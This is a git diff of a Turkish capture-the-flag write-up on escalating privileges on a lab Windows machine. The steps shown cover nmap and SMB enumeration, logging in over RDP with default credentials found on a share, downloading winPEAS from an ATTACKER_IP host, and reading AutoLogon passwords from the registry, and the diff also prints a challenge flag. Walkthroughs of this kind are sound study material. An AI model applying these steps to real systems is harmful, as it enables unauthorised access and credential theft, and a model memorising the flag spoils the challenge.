@@ -7,12 +7,9 @@
 ## Giriş
 
 Bu odada senaryo şöyle: bir zafiyet taramasında ağda unutulmuş bir Windows makinesi tespit edilmiş. Ekip küçülmesi sonrası IT tarafından düzgün temizlenmemiş, sıradan bir workstation gibi görünüyor ama içine girince katman katman kötü konfigürasyon çıkıyor. Amacımız `guest` seviyesinden başlayıp `SYSTEM` yetkisine kadar tırmanmak. Aşağıda attığım her adımı, neden o adımı attığımı ve bulduğum şeyleri elimden geldiğince detaylı anlatmaya çalıştım.
-
-*(Buraya hedef makinenin genel görünümünü / oda tanıtım sayfasının ss'i eklenecek)*
-
 ---
 
-## 1. Enumeration (Keşif)
+## 1. Enumeration
 
 İlk iş her zaman aynı: portları görmek. Klasik agresif Nmap taraması ile başladım:
 
@@ -42,14 +39,14 @@ NetBIOS_Domain_Name: PRIVESC
 DNS_Domain_Name: privesc
 Product_Version: 10.0.17763
 ```
-
-*(Buraya nmap taramasının tam çıktısının ss'i eklenecek)*
+<img width="979" height="757" alt="nmap1" src="https://github.com/user-attachments/assets/a38c86f0-216a-4f54-8c63-5398aeef2d5b" />
 
 445 portu açık olduğu için ilk aklıma gelen SMB üzerinden bilgi toplamak oldu. Bunun için **NetExec (nxc)** kullandım:
 
 ```bash
 nxc smb 10.10.XXX.XXX
 ```
+<img width="1365" height="439" alt="smb" src="https://github.com/user-attachments/assets/7d8cd793-ba38-4f98-8108-b9bdbf8ef76b" />
 
 Buradan şunları öğrendim:
 
@@ -74,33 +71,25 @@ Listede `Public` adında bir paylaşım dikkatimi çekti. Hemen içine girdim:
 ```bash
 smbclient //10.10.XXX.XXX/Public -N
 ```
+<img width="1307" height="292" alt="smb2" src="https://github.com/user-attachments/assets/df8e0eaa-b652-4e5b-9890-22581ebf9b50" />
 
-*(Buraya smbclient ile Public share'e girilen anın ss'i eklenecek)*
 
 İçeride `welcome.txt` diye bir dosya vardı, `get` komutuyla kendi makineme çektim:
 
 ```
 smb: \> get welcome.txt
 ```
+<img width="867" height="199" alt="smbget" src="https://github.com/user-attachments/assets/95fd6b01-401f-4b47-90c1-9d4adce7a48e" />
 
 Dosyanın içeriği tam bir hazine çıktı:
 
-```
-New employee default credentials
-================================
-Username : thmuser
-Password : Password1!
-
-Please change your password after first login.
-```
-
 Yeni işe başlayan personel için bırakılmış varsayılan bir kimlik bilgisi... ve hiç değiştirilmemiş. Klasik ama hâlâ çok yaygın bir hata.
 
-*(Buraya welcome.txt dosyasının içeriğinin ss'i eklenecek)*
+<img width="433" height="179" alt="welcome txt" src="https://github.com/user-attachments/assets/f267f099-10a6-4e9e-969f-54d4886a121d" />
 
 ---
 
-## 2. guest → thmuser
+## guest → thmuser
 
 Bulduğum kimlik bilgisini önce doğrulamak için NetExec kullandım:
 
@@ -114,18 +103,18 @@ Kimlik bilgileri geçerliydi. RDP portu açık olduğu için direkt masaüstüne
 xfreerdp3 /v:10.10.XXX.XXX /u:thmuser /p:'Password1!' /cert:ignore
 ```
 
-*(Buraya RDP bağlantısı sonrası masaüstünün ss'i eklenecek)*
 
 Bağlantı başarılı oldu. `C:\Users\thmuser\Desktop` dizinine gidip ilk flag'i aldım:
 
 **Soru:** What are the contents of `flag1.txt`?
+
 **Cevap:** `THM{5mb_cr3d5_1n_th3_5h4r3}`
 
-*(Buraya flag1.txt dosyasının ss'i eklenecek)*
+<img width="829" height="652" alt="flag1" src="https://github.com/user-attachments/assets/e429e3e9-23bd-476c-a03e-0f47899d07ae" />
 
 ---
 
-## 3. thmuser → notadmin
+##  thmuser → notadmin
 
 `thmuser` ile içeri girdikten sonra sistemde manuel olarak biraz gezindim ama elle bir şey bulmak zaman kaybı gibi geldiği için **winPEAS** çalıştırmaya karar verdim. Kendi makinemde küçük bir HTTP sunucusu açıp aracı hedefe indirdim:
 
@@ -140,7 +129,8 @@ Invoke-WebRequest http://ATTACKER_IP:8000/winPEASx64.exe -OutFile winpeas.exe
 .\winpeas.exe > winpeas.txt
 ```
 
-*(Buraya winPEAS'in çalıştığı terminal ekranının ss'i eklenecek)*
+<img width="947" height="690" alt="winpeas" src="https://github.com/user-attachments/assets/fee80a3c-beec-4be2-8446-e693da3d0a5c" />
+
 
 Çıktıyı incelerken **AutoLogon** başlığı altında ilginç bir şey gördüm:
 
@@ -167,7 +157,7 @@ LastUsedUsername   REG_SZ    notadmin
 
 Yani AutoLogon için kullanılan hesap `notadmin`, parolası da düz metin halinde registry'de duruyormuş. Bu, unutulmuş/yanlış yapılandırılmış otomatik oturum açma özelliklerinin ne kadar tehlikeli olabileceğine güzel bir örnek.
 
-*(Buraya registry query çıktısının ss'i eklenecek)*
+
 
 Bilgileri doğrulamak için yine NetExec kullandım:
 
